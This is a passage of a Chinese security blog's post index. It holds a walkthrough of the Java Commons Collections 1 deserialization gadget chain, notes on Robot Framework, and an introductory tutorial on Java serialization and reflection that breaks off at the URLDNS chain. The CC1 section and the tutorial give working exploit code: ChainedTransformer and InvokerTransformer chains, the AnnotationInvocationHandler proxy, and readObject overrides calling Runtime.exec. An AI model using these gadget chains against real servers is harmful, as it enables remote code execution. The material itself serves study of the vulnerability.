函数的地方，因为这是protect属性，所以只能是内部调用，此处的MapEntry方法定义好parent后，下面的setValue方法实现了checkSetValue的调用，并且传入对象可控制\n\n<img src=\"CommonsCollections1/image-20240609150225975.png\" alt=\"image-20240609150225975\" style=\"zoom:30%\" />\n\n接着使用该类实现调用`InvokerTransformer`的`transformer`方法，这里的`MapEntry`就相当于遍历键值对，这里的`entry`也就是上面传入的`parent`参数，因此调用`entry`的`setValue`方法就能最终实现调用对`checkSetValue`函数的调用，为了保证能够正常遍历执行，`map`里面需要存入至少一对键值对\n\n<img src=\"CommonsCollections1/image-20240609151056987.png\" alt=\"image-20240609151056987\" style=\"zoom:33%;\" />\n\n接着寻找调用`setValue`函数的地方（最好是`readObject`方法）\n\n###### 找到调用setValue的readObject方法的类\n\n通过寻找发现`AnnotationInvocationHandler`类的`readObject`方法中有调用`Map.Entry`的`setValue`方法\n\n<img src=\"CommonsCollections1/image-20240609151723683.png\" alt=\"image-20240609151723683\" style=\"zoom:33%;\" />\n\n其中关键部分为\n\n```java\nmemberValue.setValue(\n    new AnnotationTypeMismatchExceptionProxy(\n        value.getClass() + \"[\" + value + \"]\"\n    ).setMember(\n        annotationType.members().get(name)\n    )\n);\n```\n\n因此要做的就是更改此处的`memberValues`和传入的参数部分\n\n首先更改memberValues变量，查看该变量的赋值过程，如图所示，是可控的\n\n<img src=\"CommonsCollections1/image-20240609152150974.png\" alt=\"image-20240609152150974\" style=\"zoom:33%;\" />\n\n###### 代码构造\n\n首先需要清楚的是Runtime类并不是一个可序列化对象（没有implements Serializable），因此不能直接定义该对象，只能用反射\n\n因此Runtime.getRuntime对象获取方式更改为如下\n\n```java\nClass<?> clazz = Runtime.class;\nMethod method = clazz.getMethod(\"getRuntime\");\nRuntime r = (Runtime) method.invoke(null);\nMethod exec = clazz.getMethod(\"exec\", String.class);\nexec.invoke(r, \"calc\");\n```\n\n而Method对象是不可序列化的，因此都使用上面的InvokerTransformer类实现\n\n```java\n        Class<?> clazz = Runtime.class;\n        InvokerTransformer in = new InvokerTransformer(\"getMethod\", new Class[]{String.class,Class[].class}, new Object[]{\"getRuntime\",null}); // getRuntime\n        Method method = (Method) in.transform(clazz);\n        InvokerTransformer in2 = new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class}, new Object[]{null,null});\n        Runtime r = (Runtime) in2.transform(method);\n        InvokerTransformer in3 = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"});\n        in3.transform(r);\n//        Method method = clazz.getMethod(\"getRuntime\");\n//        Runtime r = (Runtime) method.invoke(null);\n//        Method exec = clazz.getMethod(\"exec\", String.class);\n//        exec.invoke(r, \"calc\");\n```\n\n不难发现，整体流程都是一样的，先建立InvokerTransformer对象，再调用其transform方法，因此以上代码进一步简化，通过使用ChainedTransformer数组，该数组调用transform方法可实现上一结果的输出作为下一结果的输入\n\n```java\npublic Object transform(Object object) {\n    for (int i = 0; i < iTransformers.length; i++) {\n        object = iTransformers[i].transform(object);\n    }\n    return object;\n}\n```\n\n因此我们只需要能执行transformerChain实例的transform方法，并传入参数Runtime.class作为第一个InvokerTransformer对象的传参，以上代码转换为\n\n```java\nTransformer[] transformers = new Transformer[]{\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"})\n};\nChainedTransformer transformerChain = new ChainedTransformer(transformers);\nHashMap<Object,Object> map = new HashMap<>();\nmap.put(\"value\", \"aaa\");\nMap<Object,Object> tmp = TransformedMap.decorate(map,transformerChain, transformerChain);\nfor(Map.Entry<Object,Object> entry: tmp.entrySet()){\n    entry.setValue(Runtime.class);\n}\n```\n\n想办法传入恰当参数使得`readObject`方法可以执行该`setValue`方法，回到`AnnotationInvocationHandler`的`readObject`方法，我们需要确保能进入`memberType!=null`才能继续向下执行\n\n<img src=\"CommonsCollections1/image-20240609202106159.png\" alt=\"image-20240609202106159\" style=\"zoom:33%;\" />\n\n找到memberType的来源\n\n<img src=\"CommonsCollections1/image-20240609202756792.png\" alt=\"image-20240609202756792\" style=\"zoom:33%;\" />\n\n找到type的来源，是个注释类，并且要求该注释类有从memberValues键值对中获取到的键，memberValues是我们可控制的，因此需要找到有键的注释类\n\n<img src=\"CommonsCollections1/image-20240609202826270.png\" alt=\"image-20240609202826270\" style=\"zoom:33%;\" />\n\n此处选择Target类，有键value\n\n<img src=\"CommonsCollections1/image-20240609202954612.png\" alt=\"image-20240609202954612\" style=\"zoom:33%;\" />\n\n`memberValues`传入的键值对中的键应是`value`\n\n```java\nHashMap<Object,Object> map = new HashMap<>();\nmap.put(\"value\", \"aaa\");\n```\n\n但是此处`setValue`中的对象我们难以控制，而这里`setValue`中的对象相当于是要传递给`transformerChain`的`transform`方法，该方法会依次执行`transformerChain`数组中的`InvokerTransformer`对象的`transform`方法，因此此处选择在数组中再增加一对象，使得无论传什么参都能正确返回第一个结果，只要第一个结果正确，后面肯定会依次执行，也就是此处的`ConstantTransformer`类\n\n<img src=\"CommonsCollections1/image-20240609203343324.png\" alt=\"image-20240609203343324\" style=\"zoom:50%;\" />\n\n由此，整体构造代码如下，用反射的方式获取AnnotationInvocationHandler对象是因为该方法不是public对象，不能直接在外部实例化\n\n```java\nTransformer[] transformers = new Transformer[]{\n        new ConstantTransformer(Runtime.class),\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"})\n};\nChainedTransformer transformerChain = new ChainedTransformer(transformers);\nHashMap<Object,Object> map = new HashMap<>();\nmap.put(\"value\", \"aaa\");\nMap<Object,Object> tmp = TransformedMap.decorate(map,transformerChain, transformerChain);\nClass<?> clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\nConstructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);\nconstructor.setAccessible(true);\nObject instance = constructor.newInstance(Target.class, tmp);\nserialize(instance);\nunserialize(\"data.bin\");\n```\n\n##### 进阶2\n\n选择使用lazyMap类的get方法\n\n> `LazyMap` 是一种装饰模式的实现，它包装了另一个 `Map` 对象，并添加了按需创建对象的功能。当通过 `get(Object key)` 方法访问一个不存在于 `Map` 中的键时，它会使用一个工厂对象来创建该键对应的值，并将其放入 `Map` 中。\n\n此处的`factory`是可控制的，并且此处的`key`是不需要定义的，此处的`transform`方法并不会使用传入的参数`key`\n\n<img src=\"CommonsCollections1/image-20240611142611958.png\" alt=\"image-20240611142611958\" style=\"zoom: 50%;\" />\n\n###### 确定能执行get方法的漏洞点\n\n此处选择的是AnnotationInvocationHandler类的invoke方法，因为上面已经分析了memberValues（Map）对象是可控制的，而在此处调用了memberValues对象的get方法\n\n<img src=\"CommonsCollections1/image-20240611142745004.png\" alt=\"image-20240611142745004\" style=\"zoom: 33%;\" />\n\n因此我们想办法使得AnnotationInvocationHandler的readObject方法调用此处的invoke方法，而此处调用enrtySet方法刚好满足条件，只要memberValues是AnnotationInvocationHandler类的代理对象，当memberValues调用该方法时，就会自动调用AnnotationInvocationHandler的invoke方法，最终实现该链\n\n<img src=\"CommonsCollections1/image-20240611142831708.png\" alt=\"image-20240611142831708\" style=\"zoom:33%;\" />\n\n###### 代码构造\n\nmemberValues就变成了AnnotationInvocationHandler的代理对象，并且由于传参限制，必须是Map类\n\n```java\nTransformer[] transformers = new Transformer[]{\n        new ConstantTransformer(Runtime.class),\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"})\n};\nChainedTransformer transformerChain = new ChainedTransformer(transformers);\nHashMap<Object,Object> map = new HashMap<>();\nMap tmplazymap= LazyMap.decorate(map,transformerChain);\nClass<?> clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\nConstructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);\nconstructor.setAccessible(true);\nInvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, tmplazymap);\nMap proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},invocationHandler);\nObject instance = constructor.newInstance(Override.class, proxyInstance);\nserialize(instance);\nunserialize(\"data.bin\");\n```\n\n##### 总结\n\n下图是这两个链子的流程图，都是找调用transform方法的类\n\n- 进阶一找的是`TransformedMap`的`checkValue`方法，然后在`AnnotationInvocationHandler`类中的`readObject`方法中能实现调用`checkValue`方法，通过传入构造的`TransformedMap`对象，构造的`TransformedMap`对象会传入构造的`ChainedTransformed`对象，最终实现`ChainedTransformed`的`transform`方法的调用\n- 进阶二找的是LazyMap的get方法，原理是`AnnotationInvocationHandler`类中的`invoke`方法实现了调用`get`方法，因此想办法使得`AnnotationInvocationHandler`的`readObject`方法中能实现调用其`invoke`方法，因此传入对象为`AnnotationInvocationHandler`类的实例，实例调用函数一定会调用该实例的`invoke`方法来调用实例，进而实现`get`方法调用\n\n<img src=\"CommonsCollections1/image-20240611141535037.png\" alt=\"image-20240611141535037\" style=\"zoom: 67%;\" />\n","tags":["java"],"categories":["安全"]},{"title":"RF_study","url":"/post/887fb1e7.html","content":"\n## RobotFramework\n\n基于**关键字驱动**的一种自动化测试框架，能够完美地对WebUI,APPUI,接口实现自动化测试，不需要编写代码，本身基于RF自定义的表格编写语法的形式来实现的工具的自动化测试\n\n<!--more-->\n\n不同的测试项，需要不同的库来支撑，WebUI基于Selenium，APPUI基于Appium,接口基于requests\n\n**数据驱动**：把测试用例数据放到excel/yaml里面，然后通过改变excel、yaml文件里面的数据，达到控制测试用例的执行的过程。\n\n**关键字驱动**：把项目中的一些业务逻辑或基本的操作封装成一个一个的关键字然后去调用不同的关键字，或者是关键字的组合，去实现一些不同的业务逻辑\n\n\n\n特点：\n\n1. 方便，可以以robot,txt,tsv,html等格式\n2. 可以自动生成html格式的测试报告\n3. 自带很多类库，支持很多扩展库\n4. 可以根据业务需要去自定义关键字（登录、下订单、评论）支持中文\n5. 支持非GUI方法运行，可以和jenkins持续集成\n\n\n\n##### Ride基本使用\n\n**项目--模块--子模块--测试套件--测试用例**\n\n###### 测试套件(suite)\n\n- Edit标签：\n  - Setting：设置  （Document:描述\tSuite Setup:测试套件之前的关键字\tSuite Teardown:测试套件之后的关键字\tTest Setup:套件用例之前的关键字\tTest Teardown:套件用例之后的关键字\tTest Template:测试模板\tTest Timeout:超时时间\tForce Tags:强制标记）\n  - 加载外部文件（扩展库，资源文件，变量文件，帮助文档） \n  - 定义内部变量 \n  - 定义元数据\n- Test Edit标签：\n- Run标签：运行\n\n###### 测试用例\n\n- Edit标签：\n  - Setting：设置  （Document:描述\tSetup:测试用例之前的关键字\tTeardown:测试用例之后的关键字\tTemplate:测试模板\tTimeout:超时时间\tTags:标记）\n  - 加载外部文件（扩展库，资源文件，变量文件，帮助文档） \n  - 定义内部变量 \n  - 定义元数据\n- Test Edit标签：\n- Run标签：运行\n  - Only run tests with these tags(跳过)\n  - skip tests with these tags(跳过)\n\n##### RF类库和扩展库\n\n1. 标准库（RF自带，不需要额外安装）：\n   - buitln（测试库）\n   - Collection(集合库)\n   - DataTime(时间库)\n   - screenshot(截屏库)\n   - ......\n\n2. 扩展库(需要通过pip命令额外安装)，不同的测试需要不同的库\n   - web自动化测试：SeleniumLibrary\n   - 接口自动化测试：RequestsLibrary\n   - app自动化测试：APPiumLibrary\n\n##### RF的基本使用\n\n###### 关键字\n\n- Log:打印\n\n- ${a} 12:设置变量\n\n  ```\n  *** Settings ***\n  Library    DateTime\n  *** Keywords ***\n  *** Variables ***\n  ${a}   0\n  *** Test Cases ***\n  TEST1\n      Log    ${a}\n  ```\n\n- catenate:字符串拼接\n\n  ```\n  *** Settings ***\n  Library    DateTime\n  *** Keywords ***\n  *** Variables ***\n  \n  *** Test Cases ***\n  TEST1\n      ${str}  catenate   1   2   3\n      Log    ${str}\n  ```\n\n- Create List:创建列表 \n\n  ```robot\n  *** Settings ***\n  Library    DateTime\n  Library    Collections\n  \n  *** Keywords ***\n  *** Variables ***\n  \n  *** Test Cases ***\n  TEST1\n      ${list}    Create List    1    2    3    4    5\n      Log    ${list}\n      @{list}    Create List    1    2    3    4    5\n      Log Many    @{list} #更适合做循环\n  ```\n\n  输出\n\n  <img src=\"RF-study/image-20240605161858444.png\" alt=\"image-20240605161858444\" style=\"zoom:33%;\" />\n\n- 常规关键字\t\n\n  - 输出：`${dict} = {'key1': 'value1', 'key2': 'value2'}`\n\n    ```\n    *** Settings ***\n    Library    DateTime\n    Library    Collections\n    \n    *** Keywords ***\n    *** Variables ***\n    \n    *** Test Cases ***\n    TEST1\n        ${dict}    Create Dictionary    key1    value1    key2    value2\n        Log    ${dict}\n    ```\n\n  - 获取字典所有的key和value 输出：`['key1', 'key2']\t['value1', 'value2']`\n\n    ```\n    TEST1\n        ${dict}    Create Dictionary    key1    value1    key2    value2\n        # 获取字典所有的key\n        ${keys}    Get Dictionary Keys    ${dict}\n        Log    ${keys}\n        # 获取字典所有的value\n        ${values}    Get Dictionary Values    ${dict}\n        Log    ${values}\n    ```\n\n  - 获取指定key的value\n\n    ```\n    # 获取指定key的value\n    ${value}    Get From Dictionary    ${dict}    key1\n    ```\n\n- 复杂关键字\n\n  - 执行python语句 输出：`${rand} = 37`\n\n    ```\n    TEST1\n        ${rand}    Evaluate    random.randint(1, 100)\n        Log    ${rand}\n    ```\n\n  - 执行py文件里的方法\n\n    <img src=\"RF-study/image-20240605164228397.png\" alt=\"image-20240605164228397\" style=\"zoom:33%;\" /><img src=\"RF-study/image-20240605164243888.png\" alt=\"image-20240605164243888\" style=\"zoom:33%;\" /><img src=\"RF-study/image-20240605164303657.png\" alt=\"image-20240605164303657\" style=\"zoom:50%;\" />\n\n  - if语句\n\n    <img src=\"RF-study/image-20240605164645024.png\" alt=\"image-20240605164645024\" style=\"zoom:33%;\" /><img src=\"RF-study/image-20240605164635415.png\" alt=\"image-20240605164635415\" style=\"zoom:33%;\" />\n\n##### 项目规范\n\n**项目**——init.txt(登陆获取restapi)\t->\t **模块**——init.txt(从表格中获取测试需要使用的全局变量，设置测试参数)\t->\t**子模块**——init.txt(还原测试环境（每次测试之后都会保存一些变量，重新测试需要删除这些保存的变量）)\t->\t测试文件（设置默认安全模板，如果是攻击测试，就回放攻击报文，检查是否正常告警）\n","tags":["python"],"categories":["安全"]},{"title":"Java序列化和反序列化","url":"/post/c3110923.html","content":"\n## Java序列化和反序列化入门\n\n参考视频：[Java反序列化漏洞专题-基础篇(21/09/05更新类加载部分)_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV16h411z7o9/?share_source=weixin&vd_source=5ded3ec65465babadabcd69cfc28f3fe)\n\n<!--more-->\n\n#### 初始序列化和反序列化\n\n**Java序列化**是指把Java对象转换为字节序列的过程\n\n**Java反序列化**是指把字节序列恢复为Java对象的过程\n\n> 序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。\n\n序列化函数是写文件，将序列化后的内容写到文件`ser.bin`中\n\n```java\npublic static void serialize(Object obj) throws IOException {\n    ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(\"ser.bin\")));\n    oos.writeObject(obj);\n}\n```\n\n反序列化函数是读文件，读取文件`ser.bin`文件中的内容\n\n```java\npublic static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n    ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));\n    return ois.readObject();\n}\n```\n\n##### 举例说明\n\n整体流程是首先定义了一个 `Person` 类，然后通过 `serialize` 方法将 `Person` 对象序列化到文件中，然后再通过 `unserialize` 方法将文件中的数据反序列化为 `Person` 对象。\n\n先构造一个 `Person` 类\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240326153856780.png\" alt=\"image-20240326153856780\" style=\"zoom: 33%;\" />\n\n先进行序列化生成 `ser.bin` 文件\n\n```java\npublic static void main(String[] args) throws Exception{\n    Person person = new Person(\"Alice\", 30, \"1234 Main St\", \"555-1234\");\n    System.out.println(person);\n    serialize(person);\n}\n```\n\n`ser.bin` 文件\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240326154024774.png\" alt=\"image-20240326154024774\" style=\"zoom: 33%;\" />\n\n然后进行反序列化输出 `ser.bin` 文件\n\n```java\npublic static void main(String[] args) throws Exception {\n    Person person = (Person)unserialize(\"ser.bin\");\n    System.out.println(person);\n}\n```\n\n输出内容如下，说明是成功读取了文件流\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240326154116092.png\" alt=\"image-20240326154116092\" style=\"zoom:50%;\" />\n\n###### 关键说明\n\n- **implement**\n\n  在person类中实现了一个接口，关键字`implements`用于声明一个类实现（implement）一个接口。\n\n  `implements Serializable` 表示 `Person` 类实现了 `Serializable` 接口。\n\n  > `Serializable` 接口是一个标记接口，它没有任何方法。实现了 `Serializable` 接口的类表示**这些类的对象可以被序列化**，即可以将对象转换为字节流以便在网络上传输或者将其保存到文件中。在Java中，对象的序列化和反序列化是一种常见的机制，用于持久化对象或在网络中传输对象。通过实现 `Serializable` 接口，Java虚拟机（JVM）可以对这些对象执行序列化和反序列化操作。\n\n  <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240326154534496.png\" alt=\"image-20240326154534496\" style=\"zoom: 40%;\" />\n\n  当去掉这里的 `implements Serializable` 再次执行序列化的语句就会报错，接口的函数是空的，说明不需要实现什么，但是需要标注代表该类是可以被序列化的\n\n- 不参与序列化的标记（**transient**）\n\n  > 在Java中，`transient` 关键字用于标记类的成员变量，表示这些变量不参与对象的序列化过程。当一个对象被序列化时，其 `transient` 修饰的成员变量的值不会被保存到序列化数据中，而在反序列化时，这些成员变量会被初始化为其默认值。\n  >\n  > 这种行为的设计是出于安全和灵活性的考虑。有时候，某些对象的状态可能包含**敏感信息或者不需要被序列化和持久化**，使用 `transient` 关键字可以排除这些成员变量不被序列化。例如，密码字段、临时计算结果等通常都会被标记为 `transient`。\n\n  对name标记transient\n\n  <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240326155614913.png\" alt=\"image-20240326155614913\" style=\"zoom:50%;\" />\n\n  序列化和反序列化函数执行中都不会报错，但是反序列化执行的结果name的值为null\n\n  <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240326155840350.png\" alt=\"image-20240326155840350\" style=\"zoom: 50%;\" />\n\n#### 安全问题\n\n当有序列化的对象传递到本台主机时，只要服务器端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力\n\n这个安全问题涉及到 Java 序列化的一个特性，即序列化数据中可以包含用于对象恢复的自定义逻辑。在 Java 中，当一个类实现了 `java.io.Serializable` 接口并包含 `private void readObject(ObjectInputStream in)` 和/或 `private void writeObject(ObjectOutputStream out)` 方法时，这些方法可以被用来自定义序列化和反序列化的过程。\n\n攻击者可以利用这一特性来在服务器上执行恶意代码，原理如下：\n\n1. 攻击者构造一个带有恶意逻辑的特制的序列化数据。\n2. 攻击者将这个序列化数据发送给一个服务器，服务器上的代码对这个数据进行反序列化。\n3. 在服务器端，当序列化数据被反序列化时，`readObject` 方法会被调用，而攻击者可以在这个方法中嵌入恶意代码，从而在服务器上执行这些代码。\n\n这个问题的核心在于，Java 的序列化机制允许在对象恢复时执行特定的代码，而这个特性可以被攻击者利用来在服务器端执行任意代码，从而造成严重的安全风险。\n\n###### 可利用条件\n\n- 共同条件：继承`Serializable`\n\n  > 这个条件是序列化攻击的前提条件之一。Java 中的序列化和反序列化机制是建立在类实现 `Serializable` 接口的基础上的。因此，为了利用序列化漏洞，对象必须实现 `Serializable` 接口，以便进行序列化和反序列化操作。\n\n- 入口类 source（重写`readObject`参数类型广泛，最好jdk自带）（例如：`Map类`）\n\n  > `source` 类是指在反序列化过程中执行的入口点，通常是一个包含 `readObject` 方法的类。攻击者可以在该方法中执行恶意代码。为了增加攻击的成功率，攻击者通常会寻找一些 JDK 自带的类，因为这些类在很多情况下会被信任并且有更广泛的使用场景。\n\n- 调用链 gadget chain\n\n  > 调用链指的是一系列的对象和方法调用，这些调用会在反序列化时被触发执行。攻击者会构造一个恶意的对象图，其中包含一些有漏洞的类，这些类会在反序列化时触发恶意操作。这些类和方法的组合构成了所谓的 `gadget chain`。攻击者的目标是利用这个 `gadget chain` 来实现攻击。\n\n- 执行类 sink（rce ssrf写文件等等）\n\n  > 执行类指的是被攻击者利用 `gadget chain` 中的漏洞触发执行的类或方法。这些类或方法通常会包含一些危险的操作，比如执行远程代码（RCE）、发起服务器端请求伪造（SSRF）、写文件等等。攻击者的目标就是利用 `gadget chain` 最终达到执行这些危险操作的目的。\n\n###### 可能的形式\n\n- 入口类的 `readObject` 直接调用危险方法\n\n  > 攻击者可以在序列化数据中包含一些触发恶意操作的指令，而这些指令会在 `readObject` 方法中被执行。例如，攻击者可能会在 `readObject` 中调用 `Runtime.exec()` 方法来执行系统命令，或者执行其他敏感的操作，从而实现对服务器的攻击。\n\n  比如直接在 `Person ` 类中重写 `readObject()` 方法\n\n  ```java\n  private void readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException{\n      ois.defaultReadObject();\n      Runtime.getRuntime().exec(\"calc\");\n  }\n  ```\n\n  再次序列化然后反序列化，成功弹出了计算器\n\n  <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240326162006965.png\" alt=\"image-20240326162006965\" style=\"zoom: 15%;\" />\n\n- 入口类的参数中包含可控类，该类有危险方法， `readObject` 时调用\n\n  > 攻击者可以通过控制序列化数据中的某些类的内容，使得这些类在被反序列化时调用其中的危险方法。例如，攻击者可能构造一个特定的类，其中包含一个 `finalize()` 方法，在该方法中执行恶意代码。当这个类被反序列化时，`finalize()` 方法会被自动执行，从而触发攻击。\n\n- 入口类的参数中包含可控类，该类又调用其他有危险方法的类， `readObject` 时调用\n\n  > 攻击者可能构造一个复杂的对象图，其中包含多个类，这些类之间存在调用关系。攻击者可以通过控制序列化数据中的这些类的内容，使得反序列化过程中执行危险方法。例如，攻击者可能控制一个类，该类在反序列化时调用其他类的危险方法，从而间接实现对服务器的攻击。\n\n- 构造函数/静态代码块等类加载时隐式执行\n\n  > 在 Java 中，类的构造函数和静态代码块在类加载时会被隐式执行。攻击者可以构造恶意类，其中包含有恶意代码的构造函数或静态代码块。当这些类被反序列化时，其构造函数或静态代码块会被执行，从而触发攻击。这种情况下，攻击者无需调用 `readObject` 方法，而是利用类加载时的隐式执行来触发攻击。\n\n#### Java反射和URLDNS链\n\nReflection定义\n\n> Java 的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法; 并且对于任意一个对象，都能够调用它的任意一个方法;这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。\n\n- 正射：定义类，调用方法\n\n  ```java\n  Student student = new Student();\n  student.getId(\"1\");\t\t\n  ```\n\n- 反射：**反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。**(把java类中的各种成分映射成一个个的Java对象)\n\n  ```java\n  // 通过类的全限定名获取Class对象\n  Class clazz = Class.forName(\"reflection.Student\");\n  \n  // 获取指定方法对象，这里是获取名为getId，参数类型为String的方法\n  Method method = clazz.getMethod(\"getId\", String.class);\n  \n  // 获取无参构造函数对象\n  Constructor constructor = clazz.getConstructor();\n  \n  // 通过构造函数创建类的实例\n  Object object = constructor.newInstance();\n  \n  // 调用实例的指定方法，这里是调用getId方法，并传递参数1\n  method.invoke(object, \"1\");\t\n  ```\n\n##### Reflection作用\n\n1.  **让Java具有动态性**：反射使Java可以在运行时加载和操作类，即使这些类在编译时是未知的。这在插件系统、依赖注入等场景非常有用。\n\n   ```java\n   // 假设类名是通过配置文件或其他方式动态获取的\n   String className = \"com.example.MyClass\";\n   Class<?> clazz = Class.forName(className);\n   \n   // 输出类名\n   System.out.println(\"Class loaded: \" + clazz.getName());\n   \n   ```\n\n   **解释**：\n\n   - 通过类的全限定名动态加载类。\n   - 可以根据配置文件或其他输入来决定加载哪个类，使程序更具动态性。\n\n   \n\n2.  **修改已有对象的属性**：反射可以用来访问和修改对象的私有属性。(下图实现了修改person对象的name值)\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601152713619.png\" alt=\"image-20240601152713619\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601152516036.png\" alt=\"image-20240601152516036\" style=\"zoom:40%;\" />\n\n   **解释**：\n\n   - 获取私有属性的`Field`对象。\n   - 将属性设置为可访问（即使是私有的）。\n   - 修改属性的值。\n\n   \n\n3.  **动态生成对象**：通过反射可以动态创建对象实例。\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601152819556.png\" alt=\"image-20240601152819556\" style=\"zoom:40%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601152844874.png\" alt=\"image-20240601152844874\" style=\"zoom:40%;\" />\n\n   **解释**：\n\n   - 通过`Class`对象获取构造函数。\n   - 使用构造函数动态创建对象实例。\n\n   \n\n4.  **动态调用方法**：通过反射可以在运行时调用对象的方法。\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601153144217.png\" alt=\"image-20240601153144217\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601153215161.png\" alt=\"image-20240601153215161\" style=\"zoom:33%;\" />\n\n   \n\n   **解释**：\n\n   - 通过`Class`对象获取方法对象。\n   - 使用方法对象调用方法，并传递参数。\n\n   \n\n5.  **操作内部类和私有方法**：反射可以用来操作内部类和私有方法。\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601153559550.png\" alt=\"image-20240601153559550\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601153626409.png\" alt=\"image-20240601153626409\" style=\"zoom: 25%;\" />\n\n   **解释**：\n\n   - 获取内部类和私有方法的`Class`对象和`Method`对象。\n   - 动态创建内部类实例，并调用私有方法。\n\n###### 举例说明\n\n1. **结合参数创建新对象**：直接使用 `newInstance()` 是无法传参的，但是通过获取构造函数对象函数 `getConstructor()` 函数可以实现传参（思路：从具体实例对象获取类对象，再获取创建函数对象，再创建实例对象）\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601155001867.png\" alt=\"image-20240601155001867\" style=\"zoom: 33%;\" />\n\n2. **获取类里面属性**：`getFields` 函数（输出public属性）和 `getDeclaredFields` 函数（输出public+private属性）区别，这两个函数都是获取属性对象\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601155800809.png\" alt=\"image-20240601155800809\" style=\"zoom: 25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601155941697.png\" alt=\"image-20240601155941697\" style=\"zoom: 25%;\" />\n\n   输出\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601160022885.png\" alt=\"image-20240601160022885\" style=\"zoom: 33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601160034312.png\" alt=\"image-20240601160034312\" style=\"zoom:25%;\" />\n\n3. **根据属性名获取变量参数**：`getField` 函数（public属性）和 `getDeclaredField` 函数（public+private属性），这两个函数都是获取属性对象，改变值的时候需要指定要改变的实例对象，其中对于私有对象，反射的权限是很大的，所以只需要设置 `setAccessible` 函数为true\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601160644555.png\" alt=\"image-20240601160644555\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601160503017.png\" alt=\"image-20240601160503017\" style=\"zoom: 50%;\" />\n\n4. **调用类里面的方法**：获取该方法调用的对象，同样分为 `getMethods` 函数和 `getDeclaredMethods` 函数，区别和获取属性一致\n\n   `getMethod` 函数和 `getDeclaredMethod` 函数获取单个方法对象，获取函数方法的时候，需要指明该函数需要传参的变量的类型，该函数方法在使用的时候（ `invoke`）时，要指明执行该方法的实例对象\n\n   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601161405697.png\" alt=\"image-20240601161405697\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A07/image-20240601161415478.png\" alt=\"image-20240601161415478\" style=\"zoom:50%;\" />\n\n##### URLDNS链\n\n###### 原理\n\n`HashMap` 类中存在 `readObject()` 犯法，在该方法中有一句 `putVal(hash(key),***)`\n\n<img 